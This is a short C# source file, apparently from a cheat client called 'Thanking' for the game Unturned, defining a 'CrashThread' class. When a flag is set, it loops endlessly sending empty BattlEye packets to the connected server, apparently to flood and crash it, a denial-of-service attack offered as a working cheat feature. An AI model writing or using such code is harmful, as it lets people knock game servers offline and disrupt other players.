using SDG.Unturned;
using Thanking.Attributes;
using Thanking.Utilities;

namespace Thanking.Threads
{
	public static class CrashThread
	{
		public static bool CrashServerEnabled = false;

		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected += OnDisconnect;
			
			#if DEBUG
			DebugUtilities.Log("Crash Thread Started");
			#endif
			
			Provider.onClientDisconnected += OnDisconnect;
			
			while (true)
				if (CrashServerEnabled)
					Provider.send(Provider.server, ESteamPacket.BATTLEYE, new byte[0], 0, 0);
		}

		public static void OnDisconnect() =>
			CrashServerEnabled = false;
	}
}
